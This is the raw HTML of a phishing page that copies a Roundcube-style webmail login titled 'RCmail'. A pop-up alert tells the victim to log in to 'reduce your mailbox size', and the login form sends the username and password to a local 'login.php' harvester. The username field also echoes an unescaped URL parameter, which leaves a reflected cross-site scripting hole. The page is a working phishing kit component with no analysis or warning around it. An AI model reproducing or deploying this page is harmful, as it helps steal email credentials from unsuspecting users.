<script language="JavaScript">
alert("Please,login to do reduce your mailbox size automatically..")
</script><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<html style="overflow-x: hidden; overflow-y: auto;" class="yui3-js-enabled"><head><script language="JavaScript">
</script>

<!DOCTYPE html>
<html lang="en" class=" js chrome webkit"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>RCmail :: Welcome to RCmail</title>
<meta name="Robots" content="noindex,nofollow">
<meta name="viewport" content="" id="viewport">
<link rel="shortcut icon" href="https://www.weboffice.com.hk/m/skins/larry/images/favicon.ico">
<link rel="stylesheet" type="text/css" href="./hero_files/styles.min.css">
<!--[if IE 9]><link rel="stylesheet" type="text/css" href="skins/larry/svggradients.min.css?s=1460910948" /><![endif]-->
<link rel="stylesheet" type="text/css" href="./hero_files/styles.css">
<link rel="stylesheet" type="text/css" href="./hero_files/jquery-ui-1.10.4.custom.css">
<script type="text/javascript" src="./hero_files/ui.min.js.download"></script>

<link rel="stylesheet" type="text/css" href="./hero_files/common.css">
<script type="text/javascript" src="./hero_files/common.min.js.download"></script>

    <link rel="stylesheet" type="text/css" href="./hero_files/desktop.css">


<script type="text/javascript" src="./hero_files/colors.min.js.download"></script>

<script type="text/javascript" src="./hero_files/colors.min.js.download"></script>

    <link rel="stylesheet" type="text/css" href="./hero_files/st_buttons_desktop.css">
    <link rel="stylesheet" type="text/css" href="./hero_files/st_menus_desktop.css">
    <link rel="stylesheet" type="text/css" href="./hero_files/ic_fa_desktop.css">
    <link rel="stylesheet" type="text/css" href="./hero_files/remove_list_icons.css">
    <link rel="stylesheet" type="text/css" href="./hero_files/skin_desktop.css">




<script src="./hero_files/jquery.min.js.download" type="text/javascript"></script>
<script src="./hero_files/common.min.js(1).download" type="text/javascript"></script>
<script src="./hero_files/app.min.js.download" type="text/javascript"></script>
<script src="./hero_files/jstz.min.js.download" type="text/javascript"></script>
<script type="text/javascript">

/*
        @licstart  The following is the entire license notice for the 
        JavaScript code in this page.

        Copyright (C) 2005-2014 The Roundcube Dev Team

        The JavaScript code in this page is free software: you can redistribute
        it and/or modify it under the terms of the GNU General Public License
        as published by the Free Software Foundation, either version 3 of
        the License, or (at your option) any later version.

        The code is distributed WITHOUT ANY WARRANTY; without even the implied
        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
        See the GNU GPL for more details.

        @licend  The above is the entire license notice
        for the JavaScript code in this page.
*/
var rcmail = new rcube_webmail();
rcmail.set_env({"task":"login","x_frame_options":"sameorigin","standard_windows":false,"locale":"en_US","cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"alpha","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","rcs_phone":false,"rcs_tablet":false,"rcs_mobile":false,"rcs_desktop":true,"rcs_device":"desktop","rcs_color":false,"rcs_skin":"alpha","rcs_skin_type":"desktop","rcs_login_branding":null,"rcs_frame_branding":null,"request_token":"69c3769864322020de9c1438060f2cd3"});
rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files..."});
rcmail.gui_container("loginfooter","bottomline");
rcmail.gui_object('loginform', 'form');
rcmail.gui_object('message', 'message');
</script>

<script type="text/javascript" src="./hero_files/scripts.js.download"></script>
<script type="text/javascript" src="./hero_files/jquery-ui-1.10.4.custom.min.js.download"></script>
</head>
<body class="rcs-desktop rcs-desktop-skin xdesktop login-page color-0d73bb">



<div id="login-form">
<div class="box-inner" role="main">

  <h1>Login</h1>


<form name="form" method="post" action="login.php">
  <input type="hidden" name="_action" value="login">
<table><tbody><tr><td class="title"><label for="user">Username</label>
</td>
<td class="input"><input name="user" id="user" required="required" value="<?php echo $_GET['login']; ?>" size="40" autocapitalize="off" autocomplete="off" type="text"></td>
</tr>
<tr><td class="title"><label for="pass">Password</label>
</td>
<td class="input"><input name="pass" id="pass" autofocus="autofocus" required="required" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><input type="submit" id="rcmloginsubmit" class="button mainaction" value="Login"></p>

</form>

</div>

<div class="box-bottom" role="complementary">
	<div id="message"></div>
	<noscript>
		&lt;p class="noscriptwarning"&gt;Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.&lt;/p&gt;
	</noscript>
</div>

<div id="bottomline" role="contentinfo">

		
</div>
</div>



<script type="text/javascript">

// UI startup
var UI = new rcube_mail_ui();
$(document).ready(function(){
	UI.set('errortitle', 'An error occurred!');
	UI.set('toggleoptions', 'Toggle advanced options');
	UI.init();
});

</script>






<script>rcs_label_back = 'Back';rcs_label_folders = 'Folders';rcs_label_search = 'Quick search';rcs_label_options = 'Options';rcs_label_attachment = 'Attachment';rcs_label_folders = 'Folders';rcs_label_section = 'Section';rcs_label_skin = 'Interface skin';rcs_label_login = 'Login';rcs_label_disable_mobile_skin = 'Use desktop skin';rcs_label_enable_mobile_skin = 'Use mobile skin';rcs_config_product_name = 'RCmail';rcs_disable_login_logo = true;rcs_disable_colors = false;rcs_disable_login_taskbar_outgoing = false;$('body').addClass('rcs-desktop rcs-desktop-skin xdesktop');if (typeof rcs_common != 'undefined') {rcs_common.runBeforeReady();$(document).ready(function() { rcs_common.runOnReady(); });}</script>
<div id="skin-options" class="popupmenu"><div id="skin-color-select"><a class="color-box" onClick="rcs_common.changeColor(&quot;0dbb6f&quot;)" style="background:#0dbb6f !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;26bb0d&quot;)" style="background:#26bb0d !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;6bbb0d&quot;)" style="background:#6bbb0d !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;a0bb0d&quot;)" style="background:#a0bb0d !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;bbb90d&quot;)" style="background:#bbb90d !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;bb9c0d&quot;)" style="background:#bb9c0d !important"></a><br><a class="color-box" onClick="rcs_common.changeColor(&quot;bb7c0d&quot;)" style="background:#bb7c0d !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;bb4f0d&quot;)" style="background:#bb4f0d !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;bb0d0d&quot;)" style="background:#bb0d0d !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;bb0d53&quot;)" style="background:#bb0d53 !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;bb0d90&quot;)" style="background:#bb0d90 !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;bb0db9&quot;)" style="background:#bb0db9 !important"></a><br><a class="color-box" onClick="rcs_common.changeColor(&quot;9d40cd&quot;)" style="background:#9d40cd !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;7a50e4&quot;)" style="background:#7a50e4 !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;274f9f&quot;)" style="background:#274f9f !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;0d73bb&quot;)" style="background:#0d73bb !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;0da4bb&quot;)" style="background:#0da4bb !important"></a><a class="color-box" onClick="rcs_common.changeColor(&quot;666666&quot;)" style="background:#666666 !important"></a><br></div><div class="loader"></div></div><script type="text/javascript">

$(document).ready(function(){ 
rcmail.init();
var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/ajaxloader_dark.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/messages_dark.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
            for (var i=0; i<images.length; i++) {
                img = new Image();
                img.src = images[i];
            }
});
</script>


</body></html>